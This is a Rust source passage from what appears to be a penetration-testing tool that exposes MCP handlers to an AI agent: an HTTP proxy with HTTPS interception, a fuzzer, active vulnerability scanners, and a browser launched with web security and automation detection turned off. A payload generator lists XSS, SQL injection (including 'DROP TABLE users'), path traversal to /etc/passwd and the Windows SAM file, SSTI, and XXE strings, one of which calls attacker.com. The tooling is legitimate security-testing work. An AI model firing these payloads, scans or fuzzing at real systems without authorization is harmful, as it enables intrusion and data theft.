            if let Some(hdrs) = params["headers"].as_object() {
                for (k, v) in hdrs {
                    if let Some(vs) = v.as_str() {
                        req = req.header(k.as_str(), vs);
                        req_headers_str.push_str(&format!("\n{}: {}", k, vs));
                    }
                }
            }

            let req_body = params["body"].as_str().unwrap_or("").to_string();
            if !req_body.is_empty() {
                req = req.body(req_body.clone());
            }

            let resp = req.send().await.map_err(|e| e.to_string())?;
            let status = resp.status().as_u16();
            let resp_headers: Vec<String> = resp.headers().iter()
                .map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or("")))
                .collect();
            let content_type = resp.headers().get("content-type")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("").to_string();
            let body = resp.text().await.map_err(|e| e.to_string())?;
            let time_ms = start.elapsed().as_millis() as u64;

            // Pipe into MCP traffic log for the Traffic UI
            let parsed_url = url::Url::parse(url).ok();
            let host = parsed_url.as_ref().map(|u| u.host_str().unwrap_or("")).unwrap_or("").to_string();
            let path = parsed_url.as_ref().map(|u| u.path().to_string()).unwrap_or_else(|| url.to_string());
            let tls = url.starts_with("https");

            log_mcp_traffic(McpTrafficEntry {
                id: next_mcp_traffic_id(),
                timestamp: chrono::Utc::now().to_rfc3339(),
                method: method.to_uppercase(),
                url: url.to_string(),
                host: host.clone(),
                path: path.clone(),
                tls,
                status,
                response_length: body.len(),
                response_time_ms: time_ms,
                mime_type: content_type.clone(),
                request_headers: req_headers_str,
                request_body: req_body,
                response_headers: resp_headers.join("\n"),
                response_body: if body.len() > 500_000 { body[..500_000].to_string() } else { body.clone() },
                source: "mcp".to_string(),
                notes: String::new(),
                color: String::new(),
            });

            Ok(serde_json::json!({
                "status": status,
                "headers": resp_headers,
                "body": body,
                "time_ms": time_ms,
                "size": body.len()
            }))
        }
        "encode" => {
            let data = params["data"].as_str().ok_or("Missing data")?;
            let format = params["format"].as_str().ok_or("Missing format")?;
            let result = match format {
                "base64" => Ok(base64_encode(data.as_bytes())),
                "url" => Ok(urlencoding(data)),
                "hex" => Ok(data.as_bytes().iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ")),
                _ => Err(format!("Unknown format: {}", format)),
            }?;
            Ok(serde_json::json!({ "result": result }))
        }
        "decode" => {
            let data = params["data"].as_str().ok_or("Missing data")?;
            let format = params["format"].as_str().ok_or("Missing format")?;
            let result = match format {
                "base64" => base64_decode(data).map_err(|e| e.to_string()),
                "url" => Ok(urlencoding_decode(data)),
                "hex" => {
                    let bytes: Result<Vec<u8>, _> = data.split_whitespace()
                        .map(|h| u8::from_str_radix(h, 16))
                        .collect();
                    bytes.map(|b| String::from_utf8_lossy(&b).to_string()).map_err(|e| e.to_string())
                }
                _ => Err(format!("Unknown format: {}", format)),
            }?;
            Ok(serde_json::json!({ "result": result }))
        }
        "hash" => {
            let data = params["data"].as_str().ok_or("Missing data")?;
            let algo = params["algorithm"].as_str().ok_or("Missing algorithm")?;
            let hash = compute_hash(algo, data.as_bytes());
            Ok(serde_json::json!({ "algorithm": algo, "hash": hash }))
        }
        "analyze_jwt" => {
            let token = params["token"].as_str().ok_or("Missing token")?;
            let parts: Vec<&str> = token.split('.').collect();
            if parts.len() < 2 { return Err("Invalid JWT".into()); }
            
            let header = base64_decode(parts[0]).unwrap_or_else(|_| "invalid".into());
            let payload = base64_decode(parts[1]).unwrap_or_else(|_| "invalid".into());
            
            Ok(serde_json::json!({
                "header": serde_json::from_str::<serde_json::Value>(&header).unwrap_or(serde_json::Value::String(header)),
                "payload": serde_json::from_str::<serde_json::Value>(&payload).unwrap_or(serde_json::Value::String(payload)),
                "signature": parts.get(2).unwrap_or(&""),
            }))
        }
        "generate_payload" => {
            let ptype = params["type"].as_str().ok_or("Missing type")?;
            let count = params["count"].as_u64().unwrap_or(5) as usize;
            let payloads = match ptype {
                "xss" => vec![
                    "<script>alert(1)</script>",
                    "\"><img src=x onerror=alert(1)>",
                    "'-alert(1)-'",
                    "<svg/onload=alert(1)>",
                    "javascript:alert(1)",
                    "<img src=x onerror=prompt(1)>",
                    "<body onload=alert(1)>",
                    "{{constructor.constructor('alert(1)')()}}",
                ],
                "sqli" => vec![
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "1' AND '1'='1",
                    "admin'--",
                    "' OR ''='",
                    "1; DROP TABLE users--",
                    "' UNION SELECT username,password FROM users--",
                    "1' ORDER BY 1--",
                ],
                "path_traversal" => vec![
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\config\\sam",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f",
                    "..%252f..%252f",
                    "/etc/passwd%00",
                    "....\\\\",
                    "%c0%ae%c0%ae/",
                ],
                "ssti" => vec![
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "<%= 7*7 %>",
                    "{{config}}",
                    "{{self.__class__.__mro__}}",
                ],
                "xxe" => vec![
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com\">]>",
                ],
                _ => vec!["Unknown payload type"],
            };
            let selected: Vec<&str> = payloads.into_iter().take(count).collect();
            Ok(serde_json::json!({ "type": ptype, "payloads": selected }))
        }

        // ─── Proxy Engine MCP Handlers ───────────────────────────────────
        "proxy_start" => {
            let port = params["port"].as_u64().unwrap_or(8080) as u16;
            Ok(serde_json::json!({
                "action": "proxy_start",
                "port": port,
                "instruction": "Use Tauri IPC: invoke('proxy_start', { port }) to start the proxy engine",
                "status": "ready"
            }))
        }
        "proxy_stop" => {
            Ok(serde_json::json!({
                "action": "proxy_stop",
                "instruction": "Use Tauri IPC: invoke('proxy_stop') to stop the proxy engine"
            }))
        }
        "proxy_status" => {
            Ok(serde_json::json!({
                "action": "proxy_status",
                "instruction": "Use Tauri IPC: invoke('proxy_status') to get full proxy status",
                "capabilities": {
                    "http_interception": true,
                    "https_mitm": true,
                    "websocket_detection": true,
                    "match_replace": true,
                    "interception_rules": true,
                    "tls_passthrough": true,
                    "upstream_proxy": true,
                    "response_interception": true,
                    "multiple_listeners": true,
                    "traffic_search": true
                }
            }))
        }
        "proxy_toggle_intercept" => {
            let enabled = params["enabled"].as_bool().unwrap_or(false);
            let response_intercept = params["response_intercept"].as_bool();
            Ok(serde_json::json!({
                "action": "proxy_toggle_intercept",
                "enabled": enabled,
                "response_intercept": response_intercept,
                "instruction": format!("Use Tauri IPC: invoke('proxy_toggle_intercept', {{ enabled: {} }})", enabled)
            }))
        }
        "proxy_get_traffic" => {
            let limit = params["limit"].as_u64().unwrap_or(50);
            Ok(serde_json::json!({
                "action": "proxy_get_traffic",
                "limit": limit,
                "instruction": "Use Tauri IPC: invoke('proxy_get_traffic') to retrieve all captured traffic entries",
                "fields": ["id", "timestamp", "method", "url", "host", "path", "port", "tls", "status",
                           "response_length", "response_time_ms", "mime_type", "request_headers",
                           "request_body", "response_headers", "response_body", "source", "notes", "color"]
            }))
        }
        "proxy_search_traffic" => {
            let query = params["query"].as_str().ok_or("Missing query")?;
            Ok(serde_json::json!({
                "action": "proxy_search_traffic",
                "query": query,
                "instruction": format!("Use Tauri IPC: invoke('proxy_search_traffic', {{ query: '{}' }})", query),
                "searches_in": ["url", "host", "path", "request_headers", "response_body"]
            }))
        }
        "proxy_add_match_replace" => {
            let name = params["name"].as_str().ok_or("Missing name")?;
            let target = params["target"].as_str().ok_or("Missing target")?;
            let match_pattern = params["match_pattern"].as_str().ok_or("Missing match_pattern")?;
            let replace_value = params["replace_value"].as_str().ok_or("Missing replace_value")?;
            let is_regex = params["is_regex"].as_bool().unwrap_or(false);
            let direction = params["direction"].as_str().unwrap_or("both");
            let id = uuid::Uuid::new_v4().to_string();

            Ok(serde_json::json!({
                "action": "proxy_add_match_replace",
                "rule": {
                    "id": id,
                    "name": name,
                    "target": target,
                    "match_pattern": match_pattern,
                    "replace_value": replace_value,
                    "is_regex": is_regex,
                    "direction": direction,
                    "enabled": true
                },
                "instruction": "Use Tauri IPC: invoke('proxy_add_match_replace_rule', { rule }) with the above rule object"
            }))
        }
        "proxy_get_match_replace" => {
            Ok(serde_json::json!({
                "action": "proxy_get_match_replace",
                "instruction": "Use Tauri IPC: invoke('proxy_get_match_replace_rules') to list all rules"
            }))
        }
        "proxy_add_tls_passthrough" => {
            let host = params["host"].as_str().ok_or("Missing host")?;
            let port = params["port"].as_u64().map(|p| p as u16);
            let id = uuid::Uuid::new_v4().to_string();

            Ok(serde_json::json!({
                "action": "proxy_add_tls_passthrough",
                "entry": {
                    "id": id,
                    "enabled": true,
                    "host": host,
                    "port": port,
                    "notes": ""
                },
                "instruction": "Use Tauri IPC: invoke('proxy_add_tls_passthrough', { entry }) with the above entry"
            }))
        }
        "proxy_set_upstream" => {
            let enabled = params["enabled"].as_bool().unwrap_or(false);
            let proxy_type = params["proxy_type"].as_str().unwrap_or("http");
            let host = params["host"].as_str().ok_or("Missing host")?;
            let port = params["port"].as_u64().ok_or("Missing port")? as u16;

            Ok(serde_json::json!({
                "action": "proxy_set_upstream",
                "config": {
                    "enabled": enabled,
                    "proxy_type": proxy_type,
                    "host": host,
                    "port": port,
                    "username": params["username"].as_str(),
                    "password": params["password"].as_str(),
                    "bypass_patterns": []
                },
                "instruction": "Use Tauri IPC: invoke('proxy_set_upstream', { config }) with the above config"
            }))
        }
        "proxy_get_websocket_messages" => {
            Ok(serde_json::json!({
                "action": "proxy_get_websocket_messages",
                "instruction": "Use Tauri IPC: invoke('proxy_get_websocket_messages') to retrieve all WS messages",
                "fields": ["id", "connection_id", "direction", "opcode", "data", "length", "timestamp", "host", "url"]
            }))
        }
        "proxy_add_interception_rule" => {
            let name = params["name"].as_str().ok_or("Missing name")?;
            let rule_type = params["rule_type"].as_str().ok_or("Missing rule_type")?;
            let pattern = params["pattern"].as_str().ok_or("Missing pattern")?;
            let action = params["action"].as_str().unwrap_or("intercept");
            let target = params["target"].as_str().unwrap_or("both");
            let id = uuid::Uuid::new_v4().to_string();

            let rule_type_obj = match rule_type {
                "url_contains" => serde_json::json!({"type": "url_contains", "pattern": pattern}),
                "url_regex" => serde_json::json!({"type": "url_regex", "pattern": pattern}),
                "host_equals" => serde_json::json!({"type": "host_equals", "host": pattern}),
                "method_equals" => serde_json::json!({"type": "method_equals", "method": pattern}),
                "file_extension" => serde_json::json!({"type": "file_extension", "extensions": pattern.split(',').collect::<Vec<_>>()}),
                _ => return Err(format!("Unknown rule_type: {}", rule_type)),
            };

            Ok(serde_json::json!({
                "action": "proxy_add_interception_rule",
                "rule": {
                    "id": id,
                    "enabled": true,
                    "name": name,
                    "rule_type": rule_type_obj,
                    "target": target,
                    "action": action
                },
                "instruction": "Use Tauri IPC: invoke('proxy_add_interception_rule', { rule }) with the above rule"
            }))
        }

        // ─── Repeater ──────────────────────────────────────────────────
        "repeat_request" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            match action {
                "send" => {
                    let method = params["method"].as_str().unwrap_or("GET");
                    let url = params["url"].as_str().ok_or("Missing url")?;
                    let client = reqwest::Client::builder().danger_accept_invalid_certs(true).build().map_err(|e| e.to_string())?;
                    let start = std::time::Instant::now();
                    let req = match method.to_uppercase().as_str() {
                        "POST" => client.post(url),
                        "PUT" => client.put(url),
                        "DELETE" => client.delete(url),
                        "PATCH" => client.patch(url),
                        "HEAD" => client.head(url),
                        _ => client.get(url),
                    };
                    let resp = req.send().await.map_err(|e| e.to_string())?;
                    let status = resp.status().as_u16();
                    let headers: Vec<String> = resp.headers().iter().map(|(k, v)| format!("{}: {}", k, v.to_str().unwrap_or(""))).collect();
                    let body = resp.text().await.map_err(|e| e.to_string())?;
                    Ok(serde_json::json!({ "status": status, "headers": headers, "body": body, "time_ms": start.elapsed().as_millis() as u64, "size": body.len() }))
                }
                _ => Ok(serde_json::json!({ "action": action, "instruction": format!("Use Tauri IPC for Repeater action: {}", action) }))
            }
        }

        // ─── Intruder/Fuzzer ────────────────────────────────────────────
        "fuzz_request" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            match action {
                "create" => {
                    let template = params["request_template"].as_str().unwrap_or("");
                    let attack_type = params["attack_type"].as_str().unwrap_or("sniper");
                    let id = uuid::Uuid::new_v4().to_string();
                    Ok(serde_json::json!({
                        "attack_id": id,
                        "attack_type": attack_type,
                        "template": template,
                        "status": "created",
                        "positions": template.matches('§').count() / 2,
                        "instruction": "Use Tauri IPC or frontend to start the attack with this ID"
                    }))
                }
                "start" => {
                    let id = params["attack_id"].as_str().unwrap_or("unknown");
                    Ok(serde_json::json!({ "attack_id": id, "status": "running", "instruction": "Attack started via frontend Intruder module" }))
                }
                _ => Ok(serde_json::json!({ "action": action, "instruction": format!("Use frontend Intruder module for: {}", action) }))
            }
        }

        // ─── Scanner ────────────────────────────────────────────────────
        "scan_target" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            match action {
                "start" => {
                    let target = params["target"].as_str().ok_or("Missing target URL")?;
                    let scan_type = params["scan_type"].as_str().unwrap_or("passive_audit");
                    let id = uuid::Uuid::new_v4().to_string();

                    // Real passive scan
                    let client = reqwest::Client::builder().danger_accept_invalid_certs(true).build().map_err(|e| e.to_string())?;
                    let resp = client.get(target).send().await.map_err(|e| e.to_string())?;
                    let headers_map: std::collections::HashMap<String, String> = resp.headers().iter()
                        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                        .collect();

                    let mut findings = Vec::new();
                    if !headers_map.contains_key("x-frame-options") { findings.push(serde_json::json!({"name":"Missing X-Frame-Options","severity":"medium","confidence":"certain"})); }
                    if !headers_map.contains_key("content-security-policy") { findings.push(serde_json::json!({"name":"Missing CSP","severity":"medium","confidence":"certain"})); }
                    if !headers_map.contains_key("strict-transport-security") { findings.push(serde_json::json!({"name":"Missing HSTS","severity":"low","confidence":"certain"})); }
                    if !headers_map.contains_key("x-content-type-options") { findings.push(serde_json::json!({"name":"Missing X-Content-Type-Options","severity":"low","confidence":"certain"})); }
                    if let Some(server) = headers_map.get("server") {
                        if server.chars().any(|c| c.is_ascii_digit()) {
                            findings.push(serde_json::json!({"name":"Server Version Disclosure","severity":"info","detail":server}));
                        }
                    }
                    if headers_map.contains_key("x-powered-by") {
                        findings.push(serde_json::json!({"name":"X-Powered-By Disclosure","severity":"info","detail":headers_map.get("x-powered-by")}));
                    }

                    Ok(serde_json::json!({
                        "scan_id": id, "target": target, "scan_type": scan_type,
                        "status": "completed", "findings_count": findings.len(), "findings": findings
                    }))
                }
                "get_issues" => {
                    let scan_id = params["scan_id"].as_str().unwrap_or("unknown");
                    Ok(serde_json::json!({ "scan_id": scan_id, "instruction": "Use Tauri IPC to get scan issues" }))
                }
                _ => Ok(serde_json::json!({ "action": action, "instruction": format!("Scanner action: {}", action) }))
            }
        }

        // ─── Sequencer (Token Analysis) ─────────────────────────────────
        "analyze_tokens" => {
            let tokens: Vec<&str> = params["tokens"].as_array()
                .ok_or("Missing tokens array")?
                .iter()
                .filter_map(|v| v.as_str())
                .collect();

            if tokens.len() < 2 { return Err("Need at least 2 tokens".into()); }

            let all_chars: String = tokens.join("");
            let char_set: std::collections::HashSet<char> = all_chars.chars().collect();

            // Shannon entropy
            let mut freq: std::collections::HashMap<char, usize> = std::collections::HashMap::new();
            for c in all_chars.chars() { *freq.entry(c).or_insert(0) += 1; }
            let len = all_chars.len() as f64;
            let entropy: f64 = -freq.values().map(|&f| { let p = f as f64 / len; p * p.log2() }).sum::<f64>();
            let max_entropy = (char_set.len() as f64).log2();
            let normalized = if max_entropy > 0.0 { (entropy / max_entropy) * 100.0 } else { 0.0 };

            let rating = if normalized > 90.0 { "Excellent" } else if normalized > 70.0 { "Reasonable" } else if normalized > 40.0 { "Poor" } else { "Critical" };

            // Duplicates
            let unique: std::collections::HashSet<&&str> = tokens.iter().collect();
            let duplicates = tokens.len() - unique.len();

            Ok(serde_json::json!({
                "entropy_percent": (normalized * 100.0).round() / 100.0,
                "rating": rating,
                "token_count": tokens.len(),
                "avg_length": all_chars.len() / tokens.len(),
                "unique_chars": char_set.len(),
                "duplicates": duplicates,
                "collision_rate_percent": (duplicates as f64 / tokens.len() as f64 * 100.0 * 100.0).round() / 100.0,
                "shannon_entropy_bits": (entropy * 100.0).round() / 100.0,
                "max_possible_entropy": (max_entropy * 100.0).round() / 100.0
            }))
        }

        // ─── Comparer ───────────────────────────────────────────────────
        "compare_data" => {
            let item1 = params["item_1"].as_str().ok_or("Missing item_1")?;
            let item2 = params["item_2"].as_str().ok_or("Missing item_2")?;
            let mode = params["mode"].as_str().unwrap_or("words");

            let (units1, units2) = if mode == "lines" {
                (item1.split('\n').collect::<Vec<_>>(), item2.split('\n').collect::<Vec<_>>())
            } else {
                (item1.split_whitespace().collect::<Vec<_>>(), item2.split_whitespace().collect::<Vec<_>>())
            };

            let mut added = 0usize;
            let mut removed = 0usize;
            let mut equal = 0usize;
            let mut diffs = Vec::new();

            // Simple LCS-based diff
            let m = units1.len();
            let n = units2.len();
            let mut dp = vec![vec![0usize; n + 1]; m + 1];
            for i in 1..=m { for j in 1..=n {
                dp[i][j] = if units1[i-1] == units2[j-1] { dp[i-1][j-1] + 1 } else { dp[i-1][j].max(dp[i][j-1]) };
            }}

            let (mut i, mut j) = (m, n);
            let mut ops = Vec::new();
            while i > 0 || j > 0 {
                if i > 0 && j > 0 && units1[i-1] == units2[j-1] {
                    ops.push(("equal", units1[i-1])); equal += 1; i -= 1; j -= 1;
                } else if j > 0 && (i == 0 || dp[i][j-1] >= dp[i-1][j]) {
                    ops.push(("add", units2[j-1])); added += 1; j -= 1;
                } else {
                    ops.push(("remove", units1[i-1])); removed += 1; i -= 1;
                }
            }
            ops.reverse();

            for (op, val) in &ops {
                diffs.push(serde_json::json!({"type": op, "value": val}));
            }

            Ok(serde_json::json!({
                "mode": mode,
                "stats": { "added": added, "removed": removed, "equal": equal },
                "total_changes": added + removed,
                "diffs": diffs
            }))
        }

        // ─── Logger ─────────────────────────────────────────────────────
        "query_logs" => {
            let tool = params["tool"].as_str().unwrap_or("all");
            let filter = params["filter"].as_str().unwrap_or("");
            let limit = params["limit"].as_u64().unwrap_or(100);
            Ok(serde_json::json!({
                "action": "query_logs",
                "tool_filter": tool,
                "search_filter": filter,
                "limit": limit,
                "instruction": "Use Tauri IPC: invoke('proxy_get_traffic') filtered by tool source",
                "fields": ["id","timestamp","tool","method","url","status","length","time_ms"]
            }))
        }

        // ─── Organizer ──────────────────────────────────────────────────
        "organize_findings" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            let id = uuid::Uuid::new_v4().to_string();
            match action {
                "save" => Ok(serde_json::json!({
                    "item_id": id,
                    "url": params["url"].as_str(),
                    "method": params["method"].as_str(),
                    "notes": params["notes"].as_str().unwrap_or(""),
                    "status": params["status"].as_str().unwrap_or("new"),
                    "collection": params["collection"].as_str().unwrap_or("Default"),
                    "saved": true
                })),
                _ => Ok(serde_json::json!({ "action": action, "instruction": format!("Use frontend Organizer module for: {}", action) }))
            }
        }

        // ─── Proxy Capabilities ─────────────────────────────────────────
        "proxy_get_capabilities" => {
            Ok(serde_json::json!({
                "capabilities": {
                    "http_interception": true,
                    "https_mitm": true,
                    "response_interception": true,
                    "websocket_detection": true,
                    "websocket_frame_edit": false,
                    "match_replace": true,
                    "interception_rules": true,
                    "tls_passthrough": true,
                    "upstream_proxy": true,
                    "invisible_proxying": true,
                    "multiple_listeners": true,
                    "traffic_search": true,
                    "traffic_export": true,
                    "ca_management": true,
                    "custom_ca_key": true,
                    "client_certificates": false,
                    "http2": false,
                    "http3": false,
                    "send_to_repeater": true,
                    "send_to_intruder": true,
                    "send_to_organizer": true,
                    "context_menu": true,
                    "highlight_entries": true,
                    "copy_as_curl": true
                }
            }))
        }

        // ─── Proxy Statistics ───────────────────────────────────────────
        "proxy_get_statistics" => {
            Ok(serde_json::json!({
                "action": "proxy_get_statistics",
                "instruction": "Use Tauri IPC: invoke('proxy_get_statistics') to get runtime stats",
                "available_fields": ["total_requests","total_responses","intercepted_count","bytes_sent","bytes_received","active_connections","uptime_seconds"]
            }))
        }

        // ─── Inspector ──────────────────────────────────────────────────
        "inspect_message" => {
            let raw = params["raw_message"].as_str().ok_or("Missing raw_message")?;
            let lines: Vec<&str> = raw.lines().collect();
            let first_line = lines.first().unwrap_or(&"");

            let mut headers = Vec::new();
            let mut cookies = Vec::new();
            let mut params_list = Vec::new();

            // Parse first line
            let parts: Vec<&str> = first_line.split_whitespace().collect();
            let method = parts.first().unwrap_or(&"GET");
            let path = parts.get(1).unwrap_or(&"/");

            // Parse query params from URL
            if let Some(q) = path.split('?').nth(1) {
                for pair in q.split('&') {
                    let kv: Vec<&str> = pair.splitn(2, '=').collect();
                    params_list.push(serde_json::json!({
                        "source": "url", "name": kv[0],
                        "value": kv.get(1).unwrap_or(&""),
                        "decoded": urlencoding_decode(kv.get(1).unwrap_or(&""))
                    }));
                }
            }

            // Parse headers
            for line in &lines[1..] {
                if line.is_empty() { break; }
                if let Some(idx) = line.find(':') {
                    let key = &line[..idx];
                    let value = line[idx+1..].trim();
                    headers.push(serde_json::json!({"name": key, "value": value}));
                    if key.eq_ignore_ascii_case("cookie") {
                        for cookie in value.split(';') {
                            let ckv: Vec<&str> = cookie.trim().splitn(2, '=').collect();
                            cookies.push(serde_json::json!({
                                "name": ckv[0].trim(),
                                "value": ckv.get(1).unwrap_or(&"").trim()
                            }));
                        }
                    }
                }
            }

            // Parse body params
            let body_start = raw.find("\n\n").or_else(|| raw.find("\r\n\r\n"));
            let body = body_start.map(|i| &raw[i..]).unwrap_or("").trim();
            if !body.is_empty() && body.contains('=') {
                for pair in body.split('&') {
                    let kv: Vec<&str> = pair.splitn(2, '=').collect();
                    params_list.push(serde_json::json!({
                        "source": "body", "name": kv[0],
                        "value": kv.get(1).unwrap_or(&"")
                    }));
                }
            }

            Ok(serde_json::json!({
                "method": method,
                "path": path.split('?').next().unwrap_or(path),
                "headers": headers,
                "query_params": params_list.iter().filter(|p| p["source"] == "url").collect::<Vec<_>>(),
                "body_params": params_list.iter().filter(|p| p["source"] == "body").collect::<Vec<_>>(),
                "cookies": cookies,
                "body": body,
                "has_body": !body.is_empty()
            }))
        }

        // ─── Traffic management ─────────────────────────────────────────
        "proxy_clear_traffic" => {
            Ok(serde_json::json!({
                "action": "proxy_clear_traffic",
                "instruction": "Use Tauri IPC: invoke('proxy_clear_traffic') to clear all traffic"
            }))
        }
        "proxy_export_traffic" => {
            let format = params["format"].as_str().unwrap_or("json");
            Ok(serde_json::json!({
                "action": "proxy_export_traffic",
                "format": format,
                "instruction": "Use Tauri IPC: invoke('proxy_export_traffic') to export traffic"
            }))
        }

        // ─── Browser Navigation ─────────────────────────────────────────
        "browser_navigate" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            match action {
                "open" | "navigate" => {
                    let url = params["url"].as_str().ok_or("Missing url")?;
                    let wait_ms = params["wait_ms"].as_u64().unwrap_or(2000);
                    let cdp_port = crate::browser::get_cdp_port();
                    let cdp_active = crate::browser::is_cdp_active();

                    if !cdp_active {
                        // Launch browser with CDP for the first time
                        let browsers = crate::browser::detect_browsers();
                        let browser = browsers.first().ok_or("No Chromium browser found")?;
                        let profile_dir = format!("{}/.wondersuite/browser-profile",
                            std::env::var("USERPROFILE").unwrap_or_else(|_| std::env::var("HOME").unwrap_or_default()));

                        // Use proper launch with CDP + optional proxy
                        let mut args: Vec<String> = vec![
                            format!("--remote-debugging-port={}", cdp_port),
                            "--remote-allow-origins=*".into(),
                            format!("--user-data-dir={}", profile_dir),
                            "--disable-blink-features=AutomationControlled".into(),
                            "--excludeSwitches=enable-automation".into(),
                            "--disable-features=AutomationControlled".into(),
                            "--disable-ipc-flooding-protection".into(),
                            "--no-first-run".into(),
                            "--no-default-browser-check".into(),
                            "--ignore-certificate-errors".into(),
                            "--disable-web-security".into(),
                            "--disable-site-isolation-trials".into(),
                            url.to_string(),
                        ];

                        // Only add proxy if explicitly needed (don't break direct connections)
                        // The MCP tool won't add proxy — browser goes direct for enterprise pentesting

                        let child = std::process::Command::new(&browser.path).args(&args).spawn()
                            .map_err(|e| format!("Failed to launch browser: {}", e))?;
                        if wait_ms > 0 { tokio::time::sleep(std::time::Duration::from_millis(wait_ms)).await; }

                        // Verify CDP is accessible
                        let cdp_url = format!("http://127.0.0.1:{}/json", cdp_port);
                        let client = reqwest::Client::builder().danger_accept_invalid_certs(true)
                            .timeout(std::time::Duration::from_millis(5000)).build().map_err(|e| e.to_string())?;

                        let mut tabs_info = serde_json::json!(null);
                        // Retry CDP connection a few times (browser may still be starting)
                        for _ in 0..3 {
                            if let Ok(resp) = client.get(&cdp_url).send().await {
                                if let Ok(tabs) = resp.json::<Vec<serde_json::Value>>().await {
                                    tabs_info = serde_json::json!(tabs);
                                    break;
                                }
                            }
                            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
                        }

                        Ok(serde_json::json!({
                            "action": action, "url": url, "browser": browser.name,
                            "pid": child.id(), "cdp_port": cdp_port,
                            "cdp_url": format!("http://127.0.0.1:{}", cdp_port),
                            "tabs": tabs_info,
                            "proxy": "direct (no proxy)",
                            "tip": "Use browser_execute_js to run JavaScript in this browser context"
                        }))
                    } else {
                        // Browser already running — navigate via CDP
                        let cdp_url = format!("http://127.0.0.1:{}/json", cdp_port);
                        let client = reqwest::Client::builder().danger_accept_invalid_certs(true)
                            .timeout(std::time::Duration::from_millis(5000)).build().map_err(|e| e.to_string())?;
                        let tabs_resp = client.get(&cdp_url).send().await
                            .map_err(|e| format!("CDP not reachable: {} — launch browser first with 'open' action", e))?;
                        let tabs: Vec<serde_json::Value> = tabs_resp.json().await.map_err(|e| e.to_string())?;

                        // Find first page tab and navigate it
                        if let Some(tab) = tabs.iter().find(|t| t["type"].as_str() == Some("page")) {
                            if let Some(ws_url) = tab["webSocketDebuggerUrl"].as_str() {
                                let (mut ws, _) = tokio_tungstenite::connect_async(ws_url).await
                                    .map_err(|e| format!("CDP WS connect: {}", e))?;
                                use tokio_tungstenite::tungstenite::Message;
                                use futures_util::SinkExt;
                                let nav_cmd = serde_json::json!({"id":1,"method":"Page.navigate","params":{"url":url}});
                                ws.send(Message::Text(nav_cmd.to_string().into())).await.map_err(|e| e.to_string())?;
                                if wait_ms > 0 { tokio::time::sleep(std::time::Duration::from_millis(wait_ms)).await; }
                            }
                        }

                        let page_info = if let Ok(resp) = client.get(url).send().await {
                            let status = resp.status().as_u16();
                            let body = resp.text().await.unwrap_or_default();
                            serde_json::json!({"status": status, "title": extract_html_title(&body), "body_length": body.len()})
                        } else { serde_json::json!({"note": "Browser navigated via CDP"}) };

                        Ok(serde_json::json!({
                            "action": "navigate (CDP)", "url": url,
                            "cdp_port": cdp_port, "page_info": page_info,
                        }))
                    }
                }
                "get_page" => {
                    let url = params["url"].as_str().ok_or("Missing url")?;
                    let client = reqwest::Client::builder().danger_accept_invalid_certs(true).build().map_err(|e| e.to_string())?;
                    let resp = client.get(url).send().await.map_err(|e| e.to_string())?;
                    let status = resp.status().as_u16();
                    let hdrs: Vec<String> = resp.headers().iter().map(|(k,v)| format!("{}: {}", k, v.to_str().unwrap_or(""))).collect();
                    let body = resp.text().await.unwrap_or_default();
                    Ok(serde_json::json!({"url": url, "status": status, "title": extract_html_title(&body),
                        "headers": hdrs, "body_length": body.len(), "body_preview": &body[..body.len().min(5000)],
                        "links": extract_links(&body, url), "forms": extract_forms(&body)}))
                }
                _ => Ok(serde_json::json!({"action": action, "instruction": "Browser action dispatched"}))
            }
        }

        // ─── Active Scanner (Enterprise Engine v2) ────────────────────────
        "active_scan" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let max_req = params["max_requests"].as_u64().unwrap_or(200) as u32;
            let timeout = params["timeout_ms"].as_u64().unwrap_or(10000);
            let follow = params["follow_redirects"].as_bool().unwrap_or(true);
            let checks: Vec<String> = params["checks"].as_array()
                .map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect())
                .unwrap_or_else(|| vec!["all".into()]);
            let all = checks.contains(&"all".to_string());
            let cfg = crate::scanner::ScanConfig {
                max_requests: max_req, timeout_ms: timeout, follow_redirects: follow,
                check_sqli: all || checks.contains(&"sqli".into()),
                check_xss: all || checks.contains(&"xss".into()),
                check_ssrf: all || checks.contains(&"ssrf".into()),
                check_headers: all || checks.contains(&"headers".into()),
                check_cookies: all || checks.contains(&"cookies".into()),
                check_cors: all || checks.contains(&"cors".into()),
                check_path_traversal: all || checks.contains(&"path_traversal".into()),
                check_command_injection: all || checks.contains(&"command_injection".into()),
                check_ssti: all || checks.contains(&"ssti".into()),
                check_xxe: all || checks.contains(&"xxe".into()),
                check_open_redirect: all || checks.contains(&"open_redirect".into()),
                check_info_disclosure: all || checks.contains(&"info_disclosure".into()),
                auto_crawl: params["auto_crawl"].as_bool().unwrap_or(true),
                crawl_depth: params["crawl_depth"].as_u64().unwrap_or(2) as u32,
                ..Default::default()
            };
            let result = crate::scanner::run_active_scan(target, &cfg).await?;

            // Build detailed findings with request info
            let findings_detail: Vec<serde_json::Value> = result.findings.iter().map(|f| {
                let mut v = serde_json::json!({
                    "id": f.id, "type": f.finding_type, "name": f.name,
                    "severity": f.severity, "confidence": f.confidence,
                    "url": f.url, "parameter": f.parameter, "payload": f.payload,
                    "evidence": f.evidence, "detail": f.detail,
                    "remediation": f.remediation,
                });
                if let Some(ref req) = f.request_info {
                    v["request"] = serde_json::json!({
                        "method": req.method, "url": req.url,
                        "headers": req.request_headers, "body": req.request_body,
                        "response_status": req.response_status,
                        "response_headers": req.response_headers,
                        "response_body_preview": req.response_body_preview,
                        "response_time_ms": req.response_time_ms,
